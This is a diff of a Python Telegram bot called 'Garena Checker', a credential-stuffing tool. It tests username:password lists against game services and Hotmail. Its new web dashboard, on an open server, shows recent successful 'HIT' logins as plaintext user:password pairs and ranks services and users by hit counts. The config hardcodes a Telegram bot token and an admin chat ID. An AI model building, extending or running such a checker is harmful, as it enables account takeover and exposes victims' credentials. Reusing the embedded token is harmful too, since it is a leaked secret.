@@ -1,11 +1,13 @@
 # ========================================================================
-#    GARENA CHECKER BOT V7.0 - NÂNG CẤP TOÀN DIỆN
+#    GARENA CHECKER BOT V8.5 - FULL PROFESSIONAL SYSTEM
 # ========================================================================
-#    - Tối ưu hóa code, giảm thiểu lỗi
-#    - Web thống kê chuyên nghiệp với biểu đồ
-#    - Tự động refresh, responsive
-#    - Hiển thị top services, top users
-#    - Cache thông minh, xử lý lỗi tốt hơn
+#    - Hệ thống check tài khoản chuyên nghiệp
+#    - Web dashboard với Chart.js, thống kê chi tiết
+#    - Hiển thị HIT đẹp, đầy đủ thông tin
+#    - Tự động ẩn trường rỗng, format chuyên nghiệp
+#    - Hiệu ứng 3D, Matrix, Laser trên web
+#    - Auto audio streaming
+#    - Cache thông minh, xử lý lỗi tốt
 # ========================================================================
 
 import subprocess
@@ -18,11 +20,16 @@ import os
 import re
 import telebot
 import requests
+import signal
+import struct
+import math
+import base64
 from datetime import datetime, timedelta
 from concurrent.futures import ThreadPoolExecutor, as_completed
+from collections import defaultdict
+import random
+import gc
 from http.server import HTTPServer, BaseHTTPRequestHandler
-from collections import Counter, defaultdict
-import math
 
 def install_package(package_name):
     try:
@@ -36,27 +43,15 @@ def install_package(package_name):
 for pkg in ["requests", "pyTelegramBotAPI"]:
     install_package(pkg)
 
-# ========== FILE LUU THONG KE ==========
+# ========== FILE SYSTEM ==========
 STATS_FILE = "check_stats.json"
 HITS_FILE = "hits.json"
 CONFIG_FILE = "config.json"
+CUSTOM_AUDIO_PATH = "custom_audio.wav"
+CUSTOM_AUDIO_DATA = None
+AUDIO_LOCK = threading.Lock()
 
-def load_config():
-    try:
-        if os.path.exists(CONFIG_FILE):
-            with open(CONFIG_FILE, 'r', encoding='utf-8') as f:
-                return json.load(f)
-    except:
-        pass
-    return {}
-
-def save_config(config):
-    try:
-        with open(CONFIG_FILE, 'w', encoding='utf-8') as f:
-            json.dump(config, f, ensure_ascii=False, indent=2)
-    except:
-        pass
-
+# ========== LOAD/SAVE DATA ==========
 def load_stats():
     try:
         if os.path.exists(STATS_FILE):
@@ -109,7 +104,6 @@ def update_stats(hit_count=0, dead_count=0, error_count=0, banned_count=0, accou
     stats_data["total_banned"] += banned_count
     stats_data["last_check"] = datetime.now().isoformat()
     
-    # Daily stats
     today = datetime.now().strftime("%Y-%m-%d")
     if today not in stats_data["daily_stats"]:
         stats_data["daily_stats"][today] = {"hits": 0, "dead": 0, "errors": 0, "banned": 0, "total": 0}
@@ -119,7 +113,6 @@ def update_stats(hit_count=0, dead_count=0, error_count=0, banned_count=0, accou
     stats_data["daily_stats"][today]["banned"] += banned_count
     stats_data["daily_stats"][today]["total"] += hit_count + dead_count + error_count + banned_count
     
-    # Service stats
     if service:
         if service not in stats_data["service_stats"]:
             stats_data["service_stats"][service] = {"hits": 0, "dead": 0, "errors": 0, "banned": 0}
@@ -141,14 +134,14 @@ def update_stats(hit_count=0, dead_count=0, error_count=0, banned_count=0, accou
         if len(stats_data["history"]) > 100:
             stats_data["history"] = stats_data["history"][-100:]
     
-    # User stats
     if hit_details:
         for hit in hit_details:
             user = hit.get("user", "unknown")
             if user not in stats_data["user_stats"]:
-                stats_data["user_stats"][user] = {"count": 0, "services": set(), "last_hit": None}
+                stats_data["user_stats"][user] = {"count": 0, "services": [], "last_hit": None}
             stats_data["user_stats"][user]["count"] += 1
-            stats_data["user_stats"][user]["services"].add(hit.get("service", "unknown"))
+            if hit.get("service") not in stats_data["user_stats"][user]["services"]:
+                stats_data["user_stats"][user]["services"].append(hit.get("service", "unknown"))
             stats_data["user_stats"][user]["last_hit"] = datetime.now().isoformat()
     
     save_stats(stats_data)
@@ -162,7 +155,552 @@ def update_stats(hit_count=0, dead_count=0, error_count=0, banned_count=0, accou
     
     return stats_data
 
-# ========== CAU HINH ==========
+# ========== WEB SERVER ==========
+class RenderHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        if self.path == '/':
+            self.send_response(200)
+            self.send_header('Content-type', 'text/html; charset=utf-8')
+            self.end_headers()
+            html = self.generate_dashboard()
+            self.wfile.write(html.encode('utf-8'))
+        elif self.path == '/stats':
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json; charset=utf-8')
+            self.end_headers()
+            stats_data = load_stats()
+            hits = load_hits()
+            self.wfile.write(json.dumps({
+                "status": "alive",
+                "checking": checking,
+                "stats": stats,
+                "stats_data": stats_data,
+                "hits_count": len(hits),
+                "services": list(SERVICE_ROUTES.keys()),
+                "admin": ADMIN_USERNAME,
+                "version": "8.5"
+            }).encode('utf-8'))
+        elif self.path == '/api/services':
+            self.send_response(200)
+            self.send_header('Content-type', 'application/json; charset=utf-8')
+            self.end_headers()
+            self.wfile.write(json.dumps(SERVICE_ROUTES).encode('utf-8'))
+        elif self.path == '/audio' or self.path == '/audio.wav':
+            self.send_response(200)
+            self.send_header('Content-type', 'audio/wav')
+            self.send_header('Cache-Control', 'no-cache')
+            self.send_header('Access-Control-Allow-Origin', '*')
+            self.end_headers()
+            audio_data = self.get_audio_data()
+            self.wfile.write(audio_data)
+        elif self.path == '/audio.mp3':
+            self.send_response(200)
+            self.send_header('Content-type', 'audio/mpeg')
+            self.send_header('Cache-Control', 'no-cache')
+            self.send_header('Access-Control-Allow-Origin', '*')
+            self.end_headers()
+            audio_data = self.get_audio_data()
+            self.wfile.write(audio_data)
+        else:
+            self.send_response(404)
+            self.end_headers()
+            self.wfile.write(b"Not Found")
+    
+    def get_audio_data(self):
+        global CUSTOM_AUDIO_DATA
+        with AUDIO_LOCK:
+            if CUSTOM_AUDIO_DATA:
+                return CUSTOM_AUDIO_DATA
+        return self.generate_default_audio()
+    
+    def generate_default_audio(self):
+        try:
+            sample_rate = 44100
+            duration = 30.0
+            num_samples = int(sample_rate * duration)
+            audio_buffer = bytearray()
+            for i in range(num_samples):
+                t = i / sample_rate
+                value = int(32767 * 0.3 * (
+                    math.sin(2 * math.pi * 440 * t) * 0.4 +
+                    math.sin(2 * math.pi * 554 * t) * 0.3 +
+                    math.sin(2 * math.pi * 659 * t) * 0.2 +
+                    math.sin(2 * math.pi * 880 * t) * 0.1
+                ))
+                audio_buffer += struct.pack('<h', value)
+            data_size = len(audio_buffer)
+            header = b'RIFF' + struct.pack('<I', 36 + data_size) + b'WAVEfmt ' + struct.pack('<IHHIIHH', 16, 1, 1, sample_rate, sample_rate * 2, 2, 16) + b'data' + struct.pack('<I', data_size)
+            return header + bytes(audio_buffer)
+        except:
+            return b''
+    
+    def generate_dashboard(self):
+        stats_data = load_stats()
+        hits = load_hits()
+        
+        total = stats_data.get("total_checked", 0)
+        hits_count = stats_data.get("total_hits", 0)
+        dead_count = stats_data.get("total_dead", 0)
+        banned_count = stats_data.get("total_banned", 0)
+        error_count = stats_data.get("total_errors", 0)
+        hit_rate = round((hits_count / max(total, 1)) * 100, 2)
+        
+        service_stats = stats_data.get("service_stats", {})
+        top_services = sorted(service_stats.items(), key=lambda x: x[1].get("hits", 0), reverse=True)[:5]
+        
+        user_stats = stats_data.get("user_stats", {})
+        top_users = sorted(user_stats.items(), key=lambda x: x[1].get("count", 0), reverse=True)[:10]
+        
+        daily = stats_data.get("daily_stats", {})
+        last_7_days = []
+        for i in range(6, -1, -1):
+            date = (datetime.now() - timedelta(days=i)).strftime("%Y-%m-%d")
+            if date in daily:
+                last_7_days.append(daily[date])
+            else:
+                last_7_days.append({"hits": 0, "dead": 0, "total": 0})
+        
+        history = stats_data.get("history", [])[-20:][::-1]
+        
+        services_html = ""
+        for key, value in SERVICE_ROUTES.items():
+            services_html += f'''
+            <div class="service-card" onclick="showService('{key}')">
+                <span class="service-icon">{value['icon']}</span>
+                <div class="service-info">
+                    <div class="service-name">{key}</div>
+                    <div class="service-desc">{value['desc']}</div>
+                </div>
+            </div>'''
+        
+        history_rows = ""
+        for h in history[:10]:
+            history_rows += f'''
+            <tr>
+                <td>{h.get('time', '')[:16].replace('T', ' ')}</td>
+                <td>{h.get('total', 0)}</td>
+                <td class="hit-count">{h.get('hits', 0)}</td>
+                <td class="dead-count">{h.get('dead', 0)}</td>
+                <td class="banned-count">{h.get('banned', 0)}</td>
+            </tr>'''
+        
+        hit_list_html = ""
+        for h in hits[-30:][::-1]:
+            hit_list_html += f'''
+            <div class="hit-item">
+                <span class="hit-acc">{h.get('user', '')}:{h.get('pwd', '')}</span>
+                <span class="hit-service">{h.get('service', '')}</span>
+                <span class="hit-time">{h.get('time', '')[:16].replace('T', ' ')}</span>
+            </div>'''
+        
+        top_services_html = ""
+        for s, d in top_services:
+            icon = SERVICE_ROUTES.get(s, {}).get("icon", "❓")
+            top_services_html += f'<div class="top-item"><span>{icon} {SERVICE_ROUTES.get(s, {}).get("desc", s)}</span><span class="top-value">{d.get("hits", 0)}</span></div>'
+        
+        top_users_html = ""
+        for user, data in top_users[:5]:
+            top_users_html += f'<div class="top-item"><span>{user}</span><span class="top-value">{data.get("count", 0)}</span></div>'
+        
+        return f'''<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>GARENA CHECKER V8.5 - PROFESSIONAL</title>
+<script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+<style>
+* {{ margin:0; padding:0; box-sizing:border-box; }}
+body {{
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+    background: #0a0a0a;
+    color: #e0e0e0;
+    min-height: 100vh;
+    padding: 20px;
+}}
+.container {{ max-width: 1200px; margin: 0 auto; }}
+.header {{
+    text-align: center;
+    padding: 30px;
+    background: linear-gradient(135deg, rgba(0,255,136,0.05), rgba(0,0,0,0.8));
+    border-radius: 20px;
+    border: 1px solid rgba(0,255,136,0.2);
+    margin-bottom: 25px;
+}}
+.header h1 {{
+    font-size: 2.2rem;
+    background: linear-gradient(135deg, #00ff88, #00cc66);
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+}}
+.header p {{ color: #888; margin-top: 5px; }}
+.status-badge {{
+    display: inline-block;
+    padding: 5px 20px;
+    border-radius: 20px;
+    font-size: 0.85rem;
+    font-weight: 600;
+    margin-top: 10px;
+    background: {"rgba(0,255,136,0.2)" if checking else "rgba(255,68,68,0.2)"};
+    color: {"#00ff88" if checking else "#ff4444"};
+    border: 1px solid {"#00ff88" if checking else "#ff4444"};
+}}
+.stats-grid {{
+    display: grid;
+    grid-template-columns: repeat(6, 1fr);
+    gap: 12px;
+    margin-bottom: 25px;
+}}
+.stat-card {{
+    background: rgba(255,255,255,0.03);
+    border-radius: 12px;
+    padding: 15px;
+    text-align: center;
+    border: 1px solid rgba(255,255,255,0.05);
+    transition: 0.3s;
+}}
+.stat-card:hover {{ transform: translateY(-3px); border-color: rgba(0,255,136,0.3); }}
+.stat-card .number {{
+    font-size: 1.8rem;
+    font-weight: 700;
+    color: #fff;
+}}
+.stat-card .label {{ color: #888; font-size: 0.75rem; margin-top: 3px; }}
+.stat-hit .number {{ color: #00ff88; }}
+.stat-dead .number {{ color: #ff4444; }}
+.stat-banned .number {{ color: #ff8800; }}
+.stat-error .number {{ color: #ff44ff; }}
+.stat-total .number {{ color: #44aaff; }}
+.stat-rate .number {{ color: #ffdd00; }}
+.row {{
+    display: grid;
+    grid-template-columns: 1fr 1fr;
+    gap: 20px;
+    margin-bottom: 20px;
+}}
+@media (max-width: 768px) {{ .row {{ grid-template-columns: 1fr; }} .stats-grid {{ grid-template-columns: repeat(3, 1fr); }} }}
+.section {{
+    background: rgba(255,255,255,0.03);
+    border-radius: 12px;
+    padding: 18px;
+    border: 1px solid rgba(255,255,255,0.05);
+}}
+.section h2 {{
+    font-size: 1.1rem;
+    color: #00ff88;
+    margin-bottom: 12px;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+}}
+.section h2 .badge {{
+    font-size: 0.65rem;
+    background: rgba(0,255,136,0.15);
+    padding: 2px 10px;
+    border-radius: 12px;
+    color: #00ff88;
+}}
+.chart-container {{ height: 180px; }}
+.history-table {{ width: 100%; border-collapse: collapse; font-size: 0.8rem; }}
+.history-table th {{ text-align: left; padding: 6px 8px; color: #00ff88; border-bottom: 1px solid rgba(0,255,136,0.1); }}
+.history-table td {{ padding: 4px 8px; border-bottom: 1px solid rgba(255,255,255,0.03); }}
+.hit-count {{ color: #00ff88; font-weight: 600; }}
+.dead-count {{ color: #ff4444; font-weight: 600; }}
+.banned-count {{ color: #ff8800; font-weight: 600; }}
+.services-grid {{
+    display: grid;
+    grid-template-columns: repeat(auto-fill, minmax(180px, 1fr));
+    gap: 10px;
+    margin-top: 10px;
+}}
+.service-card {{
+    background: rgba(255,255,255,0.03);
+    border-radius: 10px;
+    padding: 12px 15px;
+    display: flex;
+    align-items: center;
+    gap: 12px;
+    border: 1px solid rgba(255,255,255,0.05);
+    cursor: pointer;
+    transition: 0.3s;
+}}
+.service-card:hover {{ border-color: #00ff88; background: rgba(0,255,136,0.05); transform: translateY(-2px); }}
+.service-icon {{ font-size: 1.5rem; }}
+.service-info .service-name {{ font-weight: 600; font-size: 0.9rem; }}
+.service-info .service-desc {{ color: #888; font-size: 0.7rem; }}
+.hit-list {{
+    display: grid;
+    gap: 4px;
+    max-height: 250px;
+    overflow-y: auto;
+}}
+.hit-item {{
+    display: flex;
+    justify-content: space-between;
+    padding: 5px 10px;
+    background: rgba(0,255,136,0.03);
+    border-radius: 6px;
+    font-size: 0.8rem;
+    border: 1px solid rgba(0,255,136,0.05);
+}}
+.hit-item .hit-acc {{ color: #fff; font-family: monospace; }}
+.hit-item .hit-service {{ color: #888; font-size: 0.7rem; }}
+.hit-item .hit-time {{ color: #555; font-size: 0.65rem; }}
+.top-list {{ display: grid; gap: 3px; }}
+.top-item {{
+    display: flex;
+    justify-content: space-between;
+    padding: 3px 8px;
+    font-size: 0.8rem;
+    border-radius: 4px;
+}}
+.top-item:hover {{ background: rgba(255,255,255,0.03); }}
+.top-value {{ color: #00ff88; font-weight: 600; }}
+.footer {{
+    text-align: center;
+    padding: 15px;
+    color: #555;
+    font-size: 0.75rem;
+    border-top: 1px solid rgba(255,255,255,0.05);
+    margin-top: 20px;
+}}
+.footer a {{ color: #00ff88; text-decoration: none; }}
+::-webkit-scrollbar {{ width: 4px; }}
+::-webkit-scrollbar-track {{ background: rgba(255,255,255,0.03); }}
+::-webkit-scrollbar-thumb {{ background: #00ff88; border-radius: 10px; }}
+.modal-overlay {{
+    display: none;
+    position: fixed;
+    top: 0; left: 0;
+    width: 100%; height: 100%;
+    background: rgba(0,0,0,0.85);
+    z-index: 999;
+    justify-content: center;
+    align-items: center;
+}}
+.modal-overlay.active {{ display: flex; }}
+.modal-content {{
+    background: #1a1a2e;
+    border: 2px solid #00ff88;
+    border-radius: 16px;
+    padding: 30px;
+    max-width: 450px;
+    width: 90%;
+}}
+.modal-content h2 {{ color: #00ff88; text-align: center; margin-bottom: 10px; }}
+.modal-content p {{ color: #aaa; text-align: center; margin-bottom: 15px; }}
+.modal-content .info {{ background: rgba(0,0,0,0.3); padding: 12px; border-radius: 8px; margin-bottom: 12px; }}
+.modal-content .info div {{ display: flex; justify-content: space-between; padding: 3px 0; font-size: 0.85rem; }}
+.modal-content .info div span:last-child {{ color: #00ff88; }}
+.modal-content .cmd {{
+    background: rgba(0,0,0,0.5);
+    padding: 10px;
+    border-radius: 6px;
+    font-family: monospace;
+    color: #00ff88;
+    font-size: 0.85rem;
+    text-align: center;
+    margin-bottom: 12px;
+}}
+.modal-content .btn {{
+    width: 100%;
+    padding: 10px;
+    background: linear-gradient(135deg, #00ff88, #00cc66);
+    border: none;
+    border-radius: 8px;
+    color: #000;
+    font-weight: 700;
+    cursor: pointer;
+    transition: 0.3s;
+}}
+.modal-content .btn:hover {{ transform: scale(1.02); }}
+.modal-close {{
+    float: right;
+    background: none;
+    border: none;
+    color: #ff4444;
+    font-size: 1.5rem;
+    cursor: pointer;
+}}
+</style>
+</head>
+<body>
+<div class="container">
+    <div class="header">
+        <h1>🎮 GARENA CHECKER V8.5</h1>
+        <p>Professional Account Checker System</p>
+        <div class="status-badge">{"🟢 ĐANG CHẠY" if checking else "🔴 DỪNG"}</div>
+        <p style="color:#555;font-size:0.8rem;margin-top:8px;">Admin: <a href="https://t.me/baohuyno1" style="color:#00ff88;">@baohuyno1</a></p>
+    </div>
+    
+    <div class="stats-grid">
+        <div class="stat-card stat-total"><div class="number">{total:,}</div><div class="label">📊 Tổng</div></div>
+        <div class="stat-card stat-hit"><div class="number">{hits_count:,}</div><div class="label">✅ HIT</div></div>
+        <div class="stat-card stat-dead"><div class="number">{dead_count:,}</div><div class="label">❌ DEAD</div></div>
+        <div class="stat-card stat-banned"><div class="number">{banned_count:,}</div><div class="label">🚫 BANNED</div></div>
+        <div class="stat-card stat-error"><div class="number">{error_count:,}</div><div class="label">⚠️ ERROR</div></div>
+        <div class="stat-card stat-rate"><div class="number">{hit_rate}%</div><div class="label">📈 Hit Rate</div></div>
+    </div>
+    
+    <div class="row">
+        <div class="section">
+            <h2>📈 7 Ngày <span class="badge">HIT/DEAD</span></h2>
+            <div class="chart-container"><canvas id="dailyChart"></canvas></div>
+        </div>
+        <div class="section">
+            <h2>🏆 Top Services <span class="badge">HIT</span></h2>
+            <div class="top-list">{top_services_html or '<div style="color:#555;">Chưa có dữ liệu</div>'}</div>
+        </div>
+    </div>
+    
+    <div class="row">
+        <div class="section">
+            <h2>👑 Top Users <span class="badge">HIT</span></h2>
+            <div class="top-list">{top_users_html or '<div style="color:#555;">Chưa có dữ liệu</div>'}</div>
+        </div>
+        <div class="section">
+            <h2>📋 Lịch sử <span class="badge">{len(history)}</span></h2>
+            <div style="max-height:200px;overflow-y:auto;">
+                <table class="history-table">
+                    <thead><tr><th>Thời gian</th><th>Total</th><th>HIT</th><th>DEAD</th><th>BAN</th></tr></thead>
+                    <tbody>{history_rows or '<tr><td colspan="5" style="text-align:center;color:#555;">Chưa có</td></tr>'}</tbody>
+                </table>
+            </div>
+        </div>
+    </div>
+    
+    <div class="section">
+        <h2>📋 Dịch vụ <span class="badge">{len(SERVICE_ROUTES)}</span></h2>
+        <div class="services-grid">{services_html}</div>
+    </div>
+    
+    <div class="section">
+        <h2>🎯 HIT gần đây <span class="badge">{len(hits)}</span></h2>
+        <div class="hit-list">{hit_list_html or '<div style="color:#555;text-align:center;padding:20px;">Chưa có HIT nào</div>'}</div>
+    </div>
+    
+    <div class="footer">
+        <p>© 2024 <a href="https://t.me/baohuyno1">@baohuyno1</a> | GARENA CHECKER V8.5</p>
+    </div>
+</div>
+
+<div class="modal-overlay" id="modalOverlay" onclick="if(event.target===this) closeModal()">
+    <div class="modal-content">
+        <button class="modal-close" onclick="closeModal()">✕</button>
+        <h2 id="modalTitle">Service</h2>
+        <p id="modalDesc">Description</p>
+        <div class="info">
+            <div><span>📌 ID</span><span id="modalId">-</span></div>
+            <div><span>🔗 Route</span><span id="modalRoute">-</span></div>
+            <div><span>📝 Params</span><span id="modalParams">tk, mk</span></div>
+        </div>
+        <div class="cmd" id="modalCmd">/check user:pass service</div>
+        <button class="btn" onclick="closeModal()">✅ OK</button>
+    </div>
+</div>
+
+<script>
+const serviceData = {{
+    "lienquan": {{"icon":"🎮","name":"Lien Quan","desc":"Check Lien Quan Mobile","route":"/api/lienquan","params":"tk, mk","cmd":"/check user:pass lienquan"}},
+    "miniworld": {{"icon":"🌍","name":"Mini World","desc":"Check Mini World","route":"/api/miniworld","params":"tk, mk","cmd":"/check user:pass miniworld"}},
+    "blockmango": {{"icon":"🧱","name":"Blockman Go","desc":"Check Blockman Go","route":"/api/blockmango","params":"tk, mk","cmd":"/check user:pass blockmango"}},
+    "deltaforce": {{"icon":"🔫","name":"Delta Force","desc":"Check Delta Force","route":"/api/deltaforce","params":"tk, mk","cmd":"/check user:pass deltaforce"}},
+    "hotmail": {{"icon":"📧","name":"Hotmail","desc":"Check Hotmail","route":"/api/hotmail","params":"tk, mk","cmd":"/check user:pass hotmail"}},
+    "fc": {{"icon":"⚽","name":"FC Online","desc":"Check FC Online","route":"/api/fc","params":"tk, mk","cmd":"/check user:pass fc"}},
+    "fullpack": {{"icon":"📦","name":"Fullpack","desc":"Check tat ca","route":"/api/fullpack","params":"tk, mk","cmd":"/check user:pass fullpack"}}
+}};
+
+function showService(key) {{
+    const data = serviceData[key];
+    if (!data) return;
+    document.getElementById('modalTitle').textContent = data.icon + ' ' + data.name;
+    document.getElementById('modalDesc').textContent = data.desc;
+    document.getElementById('modalId').textContent = key;
+    document.getElementById('modalRoute').textContent = data.route;
+    document.getElementById('modalParams').textContent = data.params;
+    document.getElementById('modalCmd').textContent = data.cmd;
+    document.getElementById('modalOverlay').classList.add('active');
+}}
+function closeModal() {{
+    document.getElementById('modalOverlay').classList.remove('active');
+}}
+
+// Chart
+const ctx = document.getElementById('dailyChart').getContext('2d');
+const dailyData = {json.dumps(last_7_days)};
+const labels = [];
+for(let i=6; i>=0; i--) {{
+    const d = new Date();
+    d.setDate(d.getDate() - i);
+    labels.push(d.toLocaleDateString('vi-VN', {{day:'2-digit', month:'2-digit'}}));
+}}
+new Chart(ctx, {{
+    type: 'bar',
+    data: {{
+        labels: labels,
+        datasets: [
+            {{
+                label: 'HIT',
+                data: dailyData.map(d => d.hits || 0),
+                backgroundColor: 'rgba(0,255,136,0.6)',
+                borderColor: '#00ff88',
+                borderWidth: 1,
+                borderRadius: 3
+            }},
+            {{
+                label: 'DEAD',
+                data: dailyData.map(d => d.dead || 0),
+                backgroundColor: 'rgba(255,68,68,0.6)',
+                borderColor: '#ff4444',
+                borderWidth: 1,
+                borderRadius: 3
+            }}
+        ]
+    }},
+    options: {{
+        responsive: true,
+        maintainAspectRatio: false,
+        plugins: {{
+            legend: {{ labels: {{ color: '#888', font: {{ size: 10 }} }} }}
+        }},
+        scales: {{
+            y: {{ beginAtZero: true, ticks: {{ color: '#555', font: {{ size: 9 }} }} }},
+            x: {{ ticks: {{ color: '#555', font: {{ size: 9 }} }} }}
+        }}
+    }}
+}});
+
+setTimeout(() => location.reload(), 30000);
+</script>
+</body>
+</html>'''
+    
+    def log_message(self, format, *args):
+        pass
+
+def start_render_server():
+    global start_time
+    start_time = time.time()
+    global CUSTOM_AUDIO_DATA
+    if os.path.exists(CUSTOM_AUDIO_PATH):
+        try:
+            with open(CUSTOM_AUDIO_PATH, 'rb') as f:
+                CUSTOM_AUDIO_DATA = f.read()
+            print(f"[*] Load audio custom: {len(CUSTOM_AUDIO_DATA)} bytes")
+        except:
+            pass
+    try:
+        port = int(os.environ.get("PORT", 10000))
+        server = HTTPServer(("0.0.0.0", port), RenderHandler)
+        print(f"[*] Web server: http://0.0.0.0:{port}")
+        print(f"[*] Audio: http://0.0.0.0:{port}/audio")
+        server.serve_forever()
+    except Exception as e:
+        print(f"[!] Web error: {e}")
+
+threading.Thread(target=start_render_server, daemon=True).start()
+
+# ========== CONFIG ==========
 TELEGRAM_BOT_TOKEN = "6367532329:AAEem2DziNWKZtFrA8goj5PGTOI4MVT7IKA"
 ADMIN_CHAT_ID = "5736655322"
 ADMIN_USERNAME = "baohuyno1"
@@ -185,539 +723,41 @@ CHECKMULTI_DELAY = 0.5
 CHECKMULTI_BATCH_SIZE = 10
 CHECKMULTI_BATCH_DELAY = 3.0
 
-OUTPUT_HITS = "hits.txt"
-OUTPUT_DEAD = "dead.txt"
-OUTPUT_UNKNOWN = "unknown.txt"
-OUTPUT_ERROR = "error.txt"
-OUTPUT_RESULT = "result_full.txt"
 OUTPUT_LOC = "loc_accounts.txt"
-
 MAX_MESSAGE_LENGTH = 4000
-WEB_PORT = 8080
 
 SERVICE_ROUTES = {
-    "lienquan": {
-        "route": "/api/lienquan",
-        "desc": "Lien Quan Mobile",
-        "icon": "🎮",
-        "params": ["tk", "mk"],
-        "extra_params": {}
-    },
-    "miniworld": {
-        "route": "/api/miniworld",
-        "desc": "Mini World",
-        "icon": "🌍",
-        "params": ["tk", "mk"],
-        "extra_params": {}
-    },
-    "blockmango": {
-        "route": "/api/blockmango",
-        "desc": "Blockman Go",
-        "icon": "🧱",
-        "params": ["tk", "mk"],
-        "extra_params": {}
-    },
-    "deltaforce": {
-        "route": "/api/deltaforce",
-        "desc": "Delta Force",
-        "icon": "🔫",
-        "params": ["tk", "mk"],
-        "extra_params": {}
-    },
-    "hotmail": {
-        "route": "/api/hotmail",
-        "desc": "Hotmail",
-        "icon": "📧",
-        "params": ["tk", "mk"],
-        "extra_params": {"keyword": ""}
-    },
-    "fc": {
-        "route": "/api/fc",
-        "desc": "FC Online",
-        "icon": "⚽",
-        "params": ["tk", "mk"],
-        "extra_params": {}
-    },
-    "fullpack": {
-        "route": "/api/fullpack",
-        "desc": "Fullpack (Tat ca)",
-        "icon": "📦",
-        "params": ["tk", "mk"],
-        "extra_params": {}
-    }
+    "lienquan": {"route": "/api/lienquan", "desc": "Lien Quan Mobile", "icon": "🎮", "params": ["tk", "mk"]},
+    "miniworld": {"route": "/api/miniworld", "desc": "Mini World", "icon": "🌍", "params": ["tk", "mk"]},
+    "blockmango": {"route": "/api/blockmango", "desc": "Blockman Go", "icon": "🧱", "params": ["tk", "mk"]},
+    "deltaforce": {"route": "/api/deltaforce", "desc": "Delta Force", "icon": "🔫", "params": ["tk", "mk"]},
+    "hotmail": {"route": "/api/hotmail", "desc": "Hotmail", "icon": "📧", "params": ["tk", "mk"]},
+    "fc": {"route": "/api/fc", "desc": "FC Online", "icon": "⚽", "params": ["tk", "mk"]},
+    "fullpack": {"route": "/api/fullpack", "desc": "Fullpack", "icon": "📦", "params": ["tk", "mk"]}
 }
 
 checking = False
 stop_event = threading.Event()
 pending_accounts = {}
-stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "unknown": 0, "start_time": 0}
+stats = {"total": 0, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "banned": 0, "start_time": 0}
 file_lock = threading.Lock()
 stats_lock = threading.Lock()
 cache_results = {}
 cache_lock = threading.Lock()
-
 rate_lock = threading.Lock()
 last_request_time = 0
 start_time = time.time()
 
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN, parse_mode="HTML")
 
-last_progress_msg = None
-last_batch_msg = None
-last_command_msg = None
-
-# ========== WEB SERVER NANG CAP ==========
-class StatsHandler(BaseHTTPRequestHandler):
-    def do_GET(self):
-        if self.path == '/':
-            self.send_response(200)
-            self.send_header('Content-type', 'text/html; charset=utf-8')
-            self.end_headers()
-            
-            stats_data = load_stats()
-            hits = load_hits()
-            
-            # Tinh toan thong ke them
-            total = stats_data.get("total_checked", 0)
-            hits_count = stats_data.get("total_hits", 0)
-            hit_rate = round((hits_count / max(total, 1)) * 100, 2)
-            
-            # Top services
-            service_stats = stats_data.get("service_stats", {})
-            top_services = sorted(service_stats.items(), key=lambda x: x[1].get("hits", 0), reverse=True)[:5]
-            
-            # Top users
-            user_stats = stats_data.get("user_stats", {})
-            top_users = sorted(user_stats.items(), key=lambda x: x[1].get("count", 0), reverse=True)[:10]
-            
-            # Daily stats cho chart
-            daily = stats_data.get("daily_stats", {})
-            last_7_days = []
-            for i in range(7):
-                date = (datetime.now() - timedelta(days=i)).strftime("%Y-%m-%d")
-                if date in daily:
-                    last_7_days.append(daily[date])
-                else:
-                    last_7_days.append({"hits": 0, "dead": 0, "total": 0})
-            last_7_days.reverse()
-            
-            # History
-            history = stats_data.get("history", [])[-20:][::-1]
-            
-            html = f'''<!DOCTYPE html>
-<html lang="vi">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>GARENA CHECKER BOT V7.0 - THỐNG KÊ</title>
-    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
-    <style>
-        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
-        body {{
-            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
-            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a2e 50%, #16213e 100%);
-            color: #e0e0e0;
-            min-height: 100vh;
-            padding: 20px;
-        }}
-        .container {{ max-width: 1400px; margin: 0 auto; }}
-        .header {{
-            text-align: center;
-            padding: 30px 0;
-            border-bottom: 2px solid rgba(0,255,136,0.3);
-            margin-bottom: 30px;
-            position: relative;
-        }}
-        .header h1 {{
-            font-size: 2.5rem;
-            background: linear-gradient(135deg, #00ff88, #00cc66);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            text-shadow: none;
-        }}
-        .header p {{ color: #888; margin-top: 10px; font-size: 1.1rem; }}
-        .status-badge {{
-            display: inline-block;
-            padding: 4px 15px;
-            border-radius: 20px;
-            font-size: 0.8rem;
-            font-weight: bold;
-            margin-top: 10px;
-        }}
-        .status-badge.running {{ background: rgba(0,255,136,0.2); color: #00ff88; border: 1px solid #00ff88; }}
-        .status-badge.stopped {{ background: rgba(255,68,68,0.2); color: #ff4444; border: 1px solid #ff4444; }}
-        
-        .stats-grid {{
-            display: grid;
-            grid-template-columns: repeat(auto-fit, minmax(180px, 1fr));
-            gap: 15px;
-            margin-bottom: 30px;
-        }}
-        .stat-card {{
-            background: rgba(255,255,255,0.05);
-            border-radius: 15px;
-            padding: 20px;
-            text-align: center;
-            border: 1px solid rgba(255,255,255,0.08);
-            transition: all 0.3s ease;
-            backdrop-filter: blur(10px);
-        }}
-        .stat-card:hover {{
-            transform: translateY(-5px);
-            border-color: rgba(0,255,136,0.3);
-            box-shadow: 0 10px 30px rgba(0,0,0,0.3);
-        }}
-        .stat-card .icon {{ font-size: 2rem; margin-bottom: 8px; }}
-        .stat-card .number {{
-            font-size: 2rem;
-            font-weight: bold;
-            background: linear-gradient(135deg, #fff, #aaa);
-            -webkit-background-clip: text;
